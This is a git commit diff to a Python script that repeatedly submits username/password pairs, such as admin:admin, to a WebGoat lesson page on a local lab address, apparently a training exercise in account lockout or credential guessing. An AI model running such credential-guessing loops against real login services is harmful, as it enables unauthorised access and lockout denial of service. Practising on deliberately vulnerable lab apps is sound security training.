f0236789c17709b216e909ec250f33c0b08e6a7e
xArBoKxx <126346556+xxKoBrAx@users.noreply.github.com>
2023-12-02 08:23:56 +0000

    Update multiple_login.py

--- multiple_login.py
+++ multiple_login.py
@@ -2,9 +2,9 @@ import requests
 
 def logins():
     max_attemps = 3
-    accounts = {"jsnow":"passwd1", "jdoe":"passwd2", "jplane":"passwd3", "jeff":"jeff", "dave":"dave"}
-    headers = {'User-Agent': "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"}
-    cookies = {"JSESSIONID":"E67A4E1592BE388107FF660CB11122B5", "acopendivids":"swingset,jotto,phpbb2,redmine", "acgroupswithpersist":"nada"}
+    accounts = {"admin":"admin", "root":"rooot", "admin1":"admin1"}
+    headers = {'User-Agent': "Gecko/20100101 Firefox/115.0"}
+    cookies = {"JSESSIONID":"abc", "acopendivids":"swingset,jotto,phpbb2,redmine", "acgroupswithpersist":"nada"}
     url = "http://192.168.0.161/WebGoat/attack?Screen=63&menu=1200"
 
     login_attemps = 0
@@ -18,4 +18,3 @@ def logins():
             else:
                 print("login failed")
 logins()
-print("[*] DoS Attack Complete!")
